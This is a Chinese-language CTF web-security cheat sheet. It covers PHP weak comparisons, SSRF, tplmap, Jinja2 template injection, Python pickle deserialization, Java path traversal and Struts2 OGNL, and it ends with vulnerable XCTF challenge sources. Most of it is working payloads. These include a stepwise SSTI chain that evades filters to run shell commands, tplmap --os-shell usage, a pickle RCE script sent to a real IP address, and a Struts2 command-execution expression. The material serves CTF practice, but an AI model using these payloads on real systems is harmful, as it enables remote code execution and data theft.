在PHP中，数组的键可以是整数或者字符串，值可以是任意类型。这就意味着，你可以通过键值对的方式来访问数组的元素，就像这样：

```php
$c = array(
    "foo" => "bar",
    "baz" => "qux",
);

echo $c["foo"]; // 输出 "bar"
```

##### 科学计数法

在 PHP 中，你可以使用科学计数法来表示非常大或非常小的数字。科学计数法是一种将数字表示为基数和指数的方式。例如，3000 可以表示为 3e3，这意味着 3 乘以 10 的 3 次方。

##### md5

`md5('a')` 返回的是一个32字符的十六进制数，等效于 Python 中的 `hashlib.md5('a'.encode()).hexdigest()`

###### array_search

array_ search这个函数。先看看下面两个判断吧，array_ seach的结
果b不能是假，也就是Array [n]中必须有元素是DGGJ,同时遍历Array [n]之后对数组值
进行判断，如果存在DGGJ则终止程序。
很明显这两个条件是矛盾的，开头提到了如何绕过array_ search是核心点，既然如此就先
了解一下array_search这个函数的作用吧。其作用是在数组中查找元素，并返回其下标。
而**这个函数在进行元素查找的过程中进行的比较是==而非===**，因此同样是采取弱类型比较
的特点，因为是和没有数字字符串比较所以我们只要保证在Array [n]中存在非0下标的元
素中存在值0即可。因为在php中"字符串"==0是成立的。
最后再通过json_ encode ()将我们构造的数组进行一下转化就得到了 Array [n]的json格
式数据。

##### curl_setopt()

curl_setopt() 函数就类似 Python 的 requests，可以访问外部或内部地址。可以用它来构造 127.0.0.1 访问原本访问不到的路径

##### parse_url($url)

parse_url($url) 会把 url 解析为 http、host、port、user、pass、path 等部分

##### filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE))

只要 ip 里面有本机地址 (如 127.0.0.1、0.0.0.0) ，全部过滤

##### mt_srand

```php
<?php
mt_srand(372619038);
echo mt_rand();
?>
```

mt_srand(372619038) 设置了 mt_rand() 的种子为 372619038，这意味着接下来的 mt_rand() 函数将会返回一个固定的值

### tplmap

> Python 注入(PHP 也有 SSTI)

#### 路径注入
- 注入某个 URL 路径
```bash
./tplmap.py -u http://xxx/*
# 此处 * 为注入的变量
```
- 拿到 shell
```bash
./tplmap.py -u http://xxx/* --os-shell
```
#### GET 注入
```bash
./tplmap.py -u http://xxx/?a=1
# GET 方法参数为 a
```
#### POST 注入
参数 --data
```bash
./tplmap.py -u http://xxx/ --data='"name=a&pass=*"'
```


### Python

#### 模板注入
建议根据下面一点一点试
```
http://xxx/shrine/{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
```

#### 执行系统命令

建议根据下面一点一点试（下面的示例层层递进？）

```
http://xxx/?name={{"".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()}}

# 如果被过滤了 2、3 等数字，用下面这个
http://xxx/?name={{().__class__.__mro__[1].__subclasses__()[407]("cat /flag",shell=True,stdout=-1).communicate()[0]}}

# 在上面的基础上，又被过滤单、双引号
http://xxx/?name={{().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag

# 继续被过滤 args
http://xxx/?name={{().__class__.__mro__[1].__subclasses__()[407](request.values.a,shell=True,stdout=-1).communicate()[0]}}&a=cat /flag

# 继续 过滤了方括号，可以用__getitem__绕过
http://xxx/?name={{().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)}}&a=cat /flag

# 继续，过滤了下划线_
http://xxx/?name={{(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__

# 继续 过滤了os，可以通过get来获取
http://xxx/?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}&a=__globals__&b=os&c=cat /flag

# 继续 过滤了request，但是是再{{}}中过滤了request，没有在{% %}过滤request
http://xxx/?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
```

在上面的基础上，基本啥都被绕过了

```
http://xxx/?name={%set%20xiahua=(lipsum|select|string|list).pop(24)%}
{%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%}
{%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%}
{%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%}
{%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%}
{%set oo=dict(o=a,s=a)|join%}
{%set pp=dict(po=a,pen=a)|join%}
{%set space=chcr(32)%}
{%set xiegang=chcr(47)%}
{%set shell=(dict(cat=a)|join,space,xiegang,dict(flag=a)|join)|join%}
{%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%}
```



#### Unserializer Pickle

示例
```python
import base64
import pickle

import httpx


class A:
    def __reduce__(self):
        import subprocess
        s = '''
import subprocess

r = subprocess.run(
    'cat flag', # 此处可修改命令
    shell=True,
    check=True,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT
)
print(r.stdout.decode())
        '''
        return (subprocess.check_output, (["python3","-c",s],))


a = A()
data = {
    'payload': base64.b64encode(pickle.dumps(a)).decode()
}
a = base64.b64decode(data['payload'])
r = httpx.put('http://114.67.175.224:14014/flag', json=data)
print(f'r:{r.text}')
```

#### 语法备忘

##### 将十六进制转为十进制

`num = int(hexadecimal, 16)`

##### 按位与 &

运算规则：0&0=0; 0&1=0; 1&0=0; 1&1=1

##### 按位或 |

运算规则：0|0=0; 0|1=1; 1|0=1; 1|1=1

##### 异或 ^ 

运算规则：0^0=0; 0^1=1; 1^0=1; 1^1=0



### Java

#### URL 绕过

先试试目录穿越

```
http://xxx/download?filename=../../../web.xml
```

找到可疑的路由(com.test2.aaa1.testURL)后，构造路径

```
http://xxx/download?filename=../../../classes/com/test2/aaa1/testURL.class
```

下载testURl.class文件后进行反编译，审计代码。使用绕过协议绕过

```
http://xxx/testURL?url=url:file:///flag
http://xxx/testURL?url=%00file:///flag
```

#### Struts2

模版漏洞

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

##### Struts2-Scan

目前测试该工具扫不了漏洞，使用说明可以自己找缓存的 README



## 经典错题

### 攻防世界 unseping

类型 反序列化

```php
<?php
highlight_file(__FILE__);

class ease{
    
    private $method;
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
 
    function __destruct(){
      	// 如果 $this->method 的字符串内容在数组 array("ping") 中（意思是：'ping' 在 ['ping'] 中）
        if (in_array($this->method, array("ping"))) {
          	// 调用 $this->method 方法，参数为 $this->args
            call_user_func_array(array($this, $this->method), $this->args);
        }
    } 
 
    function ping($ip){
        exec($ip, $result);
      	// 打印变量的详细信息
        var_dump($result);
    }

    function waf($str){
        if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
            return $str;
        } else {
            echo "don't hack";
        }
    }
 
    function __wakeup(){
        foreach($this->args as $k => $v) {
            $this->args[$k] = $this->waf($v);
        }
    }   
}

$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));
?>
```

### 攻防世界 easyphp

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;

$a = $_GET['a'];
$b = $_GET['b'];

if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
        $key1 = 1;
        }else{
            die("Emmm...再想想");
        }
    }else{
    die("Emmm...");
}

$c=(array)json_decode(@$_GET['c']);
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
        $d = array_search("DGGJ", $c["n"]);
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}

if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}

?>
```

### 攻防世界 Web_php_unserialize

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

